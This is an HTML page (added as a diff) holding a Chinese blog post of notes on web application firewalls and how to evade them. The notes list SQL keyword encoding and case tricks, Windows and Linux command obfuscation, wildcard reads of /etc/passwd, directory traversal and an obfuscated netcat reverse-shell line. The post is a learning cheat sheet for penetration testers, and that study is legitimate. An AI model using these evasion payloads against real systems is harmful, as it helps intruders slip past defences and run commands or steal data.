@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"apsry.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="waf原理以及绕过笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="waf原理以及绕过笔记">
+<meta property="og:url" content="https://apsry.github.io/2022/03/26/waf%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="apsry">
+<meta property="og:description" content="waf原理以及绕过笔记">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051441.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271124453.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051079.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051066.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051127.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051120.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051209.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051275.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051693.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051735.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051933.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051105.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051050.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051186.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271151858.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271152283.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051474.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051646.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051701.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051840.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051910.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051012.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271158629.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271201184.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271209310.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271210928.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271211747.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271220405.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271221614.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271522865.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271522614.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271522434.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271522368.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524714.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524482.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524333.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524782.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524524.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524892.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524745.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524137.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524988.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524905.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524268.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524346.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524772.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524394.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524597.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524420.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524050.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524056.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524261.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524156.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524496.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524597.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524871.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524811.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524961.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524921.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524378.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271524278.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271526125.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271526182.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271242423.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271242274.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271242255.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271528061.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271528076.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271531954.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530605.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530111.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530638.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530761.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271530579.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271528188.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271529180.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537978.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537740.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537939.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537864.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537868.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537945.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537043.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537738.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537929.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537999.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537205.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537965.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537037.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537169.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537774.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537161.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537308.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537074.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537174.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537970.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537498.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537076.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537489.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537198.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537045.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537230.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537389.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537460.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537370.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537544.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537997.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537298.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537548.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537703.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537714.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537382.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537126.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537252.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537488.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537394.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537845.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537709.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537010.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537481.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537227.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537685.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537570.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271537274.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539345.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539349.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539615.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539205.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539538.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539480.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539045.png">
+<meta property="og:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271539037.png">
+<meta property="article:published_time" content="2022-03-26T11:36:00.000Z">
+<meta property="article:modified_time" content="2022-03-27T11:01:56.314Z">
+<meta property="article:author" content="apsry">
+<meta property="article:tag" content="web渗透">
+<meta property="article:tag" content="waf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051441.png">
+
+<link rel="canonical" href="https://apsry.github.io/2022/03/26/waf%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E7%BB%95%E8%BF%87/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>waf原理以及绕过笔记 | apsry</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+<!-- 引入目录截取js -->
+<script type="text/javascript" src="/js/src/abstract.js"></script>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">apsry</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">去留无意，宠辱不惊</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://apsry.github.io/2022/03/26/waf%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E4%B8%80%E4%BA%9B%E7%AE%80%E5%8D%95%E7%9A%84%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="apsry">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="apsry">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          waf原理以及绕过笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-26 19:36:00" itemprop="dateCreated datePublished" datetime="2022-03-26T19:36:00+08:00">2022-03-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-27 19:01:56" itemprop="dateModified" datetime="2022-03-27T19:01:56+08:00">2022-03-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">web渗透</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>waf原理以及绕过笔记</p>
+<span id="more"></span>
+
+<h2 id="waf原理"><a href="#waf原理" class="headerlink" title="waf原理"></a>waf原理</h2><p>Waf &#x3D; Web Application Firewall ，web应用防火墙，简单来说就是在http协议层面对我们的数据包进行检测，如果发现了可能是带有攻击性的语句，就会进行拦截。</p>
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051441.png" alt="图片"></p>
+<p>为了不让waf发现我们的意图，我们通常可以利用以下几种方式绕过waf检测。</p>
+<h2 id="一些思维导图"><a href="#一些思维导图" class="headerlink" title="一些思维导图"></a>一些思维导图</h2><p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271124453.png" alt="图片"></p>
+<h2 id="基于waf规则绕过原理"><a href="#基于waf规则绕过原理" class="headerlink" title="基于waf规则绕过原理"></a>基于waf规则绕过原理</h2><h3 id="对抗规则绕过"><a href="#对抗规则绕过" class="headerlink" title="对抗规则绕过"></a><strong>对抗规则绕过</strong></h3><p>原理：匹配不到恶意语句就不会拦截。</p>
+<h4 id="对关键字进行不同编码"><a href="#对关键字进行不同编码" class="headerlink" title="对关键字进行不同编码"></a><strong>对关键字进行不同编码</strong></h4><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * from zzz = <span class="keyword">select</span> * from  %257a%257a%257a  <span class="comment">//url编码</span></span><br><span class="line">单引号 = %u0027、%u02b9、%u02bc   <span class="comment">// Unicode编码</span></span><br><span class="line">adminuser = <span class="number">0x61646D696E75736572</span> <span class="comment">// 部分十六进制编码</span></span><br><span class="line">空格 = %20 %09 %0a %0b %0c %0d %a0  <span class="comment">//各类编码</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="对关键字进行大小写变换"><a href="#对关键字进行大小写变换" class="headerlink" title="对关键字进行大小写变换"></a><strong>对关键字进行大小写变换</strong></h4><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Union</span> <span class="keyword">select</span> = <span class="keyword">uNIoN</span> <span class="keyword">sELecT</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="通过其他语义相同的关键字替换"><a href="#通过其他语义相同的关键字替换" class="headerlink" title="通过其他语义相同的关键字替换"></a><strong>通过其他语义相同的关键字替换</strong></h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">And</span> = &amp;&amp;</span><br><span class="line"><span class="keyword">Or</span> = ||</span><br><span class="line">等于 = <span class="keyword">like</span> 或综合&lt;与&gt;判断</span><br><span class="line"><span class="keyword">if</span>(a,b,c) = <span class="keyword">case</span> <span class="keyword">when</span>(A) <span class="keyword">then</span> B <span class="keyword">else</span> C <span class="keyword">end</span></span><br><span class="line">substr(str,<span class="number">1</span>,<span class="number">1</span>) = substr (str) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span> = <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">Union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> = <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> ((<span class="keyword">select</span> <span class="number">1</span>)A <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)B;</span><br><span class="line">hex()、bin() = ascii()</span><br><span class="line">sleep() = benchmark()</span><br><span class="line">concat_ws() = group_concat()</span><br><span class="line">mid()、substr() = substring()</span><br><span class="line">@@<span class="keyword">user</span> = <span class="keyword">user</span>()</span><br><span class="line">@@datadir = datadir()</span><br></pre></td></tr></table></figure>
+
+<p>除了通过编码等价替换等方式绕过检测，我们还能配合目标特性实现绕过检测。</p>
+<h4 id="配合Windows特性"><a href="#配合Windows特性" class="headerlink" title="配合Windows特性"></a><strong>配合Windows特性</strong></h4><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami = ((((Wh<span class="symbol">^o</span><span class="symbol">^am</span><span class="string">&quot;&quot;</span>i))))      <span class="comment">//利用符号分割字符执行whoami</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051079.png" alt="图片"></p>
+<figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami = <span class="built_in">set</span> a=<span class="built_in">net</span>&amp;&amp;b=user&amp;&amp;<span class="keyword">call</span> <span class="variable">%a%</span><span class="variable">%b%</span>   //利用变量分割关键字执行whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051066.png" alt="图片"></p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set a=<span class="number">123</span>whoami<span class="number">456</span>      <span class="comment">// 为了方便演示这里设置一个变量</span></span><br><span class="line">echo <span class="meta">%</span>a:~<span class="number">3</span>,<span class="number">6</span><span class="meta">%</span>          <span class="comment">// 取出变量a的第3位开始共计6个字符</span></span><br><span class="line"><span class="meta">%</span>a:~<span class="number">3</span>,<span class="number">6</span><span class="meta">%</span>                <span class="comment">//执行取出的值，通过截取系统变量然后拼接可以绕过大部分检测</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051127.png" alt="图片"></p>
+<h4 id="配合Linux特性"><a href="#配合Linux特性" class="headerlink" title="配合Linux特性"></a><strong>配合Linux特性</strong></h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami = w<span class="string">&#x27;h&#x27;</span>o<span class="string">&#x27;a&#x27;</span>m<span class="string">&quot;i&quot;</span>  <span class="regexp">//</span>单引号或双引号连接符，需要闭合</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051120.png" alt="图片"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cat <span class="regexp">/etc/</span>passwd = cat <span class="regexp">/?t*/</span>??ss**  <span class="regexp">//</span>?,*通配符 </span><br><span class="line">whoami = <span class="regexp">/b[12312i]n/</span>w[<span class="number">23</span>sh]oa[<span class="number">2</span>msh]i <span class="regexp">//</span>[] 通配符，匹配【】中的字符</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051209.png" alt="图片"></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Whoami = a=who&amp;&amp;b=ami&amp;&amp;<span class="variable">$a</span><span class="variable">$b</span>     <span class="regexp">//</span>当然linux下也可以变量拼接</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051275.png" alt="图片"></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat <span class="string">/../../etc/passwd</span> =<span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;<span class="keyword">cd</span> <span class="string">..</span>&amp;&amp;<span class="keyword">cd</span> etc&amp;&amp;cat passwd  <span class="string">//</span>目录穿越, /被拦截</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://adsry.oss-cn-beijing.aliyuncs.com/img/202203271051693.png" alt="图片"></p>
+<p>Shell反弹也可以配合特性使用。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e <span class="regexp">/bin/</span>bash <span class="number">127.0</span>.<span class="number">0.1</span> <span class="number">1234</span> =<span class="regexp">/??n/</span>?c -e <span class="regexp">/??n/</span>b??h <span class="number">2130706433</span> <span class="number">1234</span> <span class="regexp">//</span>（<span class="number">127.0</span>.<span class="number">0.1</span> → <span class="number">2130706433</span>）</span><br></pre></td></tr></table></figure>
+
+<h4 id="配合Mysql特性"><a href="#配合Mysql特性" class="headerlink" title="配合Mysql特性"></a><strong>配合Mysql特性</strong></h4><p>&#x2F;**&#x2F;数据库注释符，中间部分被注释，可用于截断关键字，干扰waf匹配。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User() = user<span class="regexp">/**/</span>()   <span class="regexp">//</span>  注释符<span class="regexp">/**/</span>也可以用于替换空格</span><br><span class="line">Union select = <span class="regexp">/*95554*/</span>Union<span class="regexp">/*test123*/</span>select</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;<strong>!</strong>&#x2F;<strong>内敛注释，中间部分继续执行，mysql特有</strong>。</p>
